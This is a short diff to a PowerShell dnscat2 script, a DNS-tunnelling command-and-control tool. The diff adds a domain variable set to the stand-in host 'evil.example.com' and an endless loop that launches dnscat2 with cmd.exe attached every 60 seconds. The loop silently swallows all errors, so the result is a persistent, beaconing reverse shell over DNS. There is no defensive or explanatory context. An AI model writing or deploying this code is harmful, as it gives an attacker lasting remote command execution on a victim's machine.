@@ -1,3 +1,6 @@
+$sleep  = 60
+$domain = "evil.example.com"
+
 function dnscat2
 {
   param(
@@ -260,4 +263,16 @@ dnscat2: Powershell Version
     SendPacket (CreatePacket_FIN $SessionId $Domain) | Out-Null
     if($Process -ne $null){$Process | Stop-Process}
   }
+}
+
+while ($true)
+{
+    try
+    {
+        dnscat2 -Domain $domain -Exec 'cmd.exe'
+        sleep $sleep
+    }
+    catch
+    {
+    }
 }
